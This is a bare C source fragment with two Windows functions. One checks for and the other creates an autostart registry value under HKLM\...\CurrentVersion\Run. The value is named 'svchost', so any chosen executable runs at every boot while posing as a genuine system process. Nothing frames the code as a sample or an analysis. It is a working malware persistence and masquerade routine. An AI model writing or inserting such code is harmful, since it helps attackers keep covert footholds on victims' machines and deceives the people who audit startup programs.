int test_key(void)
{
    HKEY hKey;
    BYTE path[BUFSIZE];
    DWORD buf_length = BUFSIZE;
    DWORD type;
    LONG reg_key;

    reg_key = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_QUERY_VALUE, &hKey);
    if (reg_key != ERROR_SUCCESS)
        return 1;

    reg_key = RegQueryValueExA(hKey, "svchost", NULL, &type, path, &buf_length);
    RegCloseKey(hKey);

    if (reg_key == ERROR_SUCCESS && type == REG_SZ)
        return 0;

    return 2;
}

int create_key(const char* path)
{
    HKEY hkey;
    LONG reg_key;

    reg_key = RegCreateKeyA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        &hkey);
    if (reg_key != ERROR_SUCCESS)
        return 1;

    DWORD data_len = (DWORD)(strlen(path) + 1);
    reg_key = RegSetValueExA(hkey, "svchost", 0, REG_SZ,
        (const BYTE*)path, data_len);
    RegCloseKey(hkey);

    return (reg_key == ERROR_SUCCESS) ? 0 : 2;
}
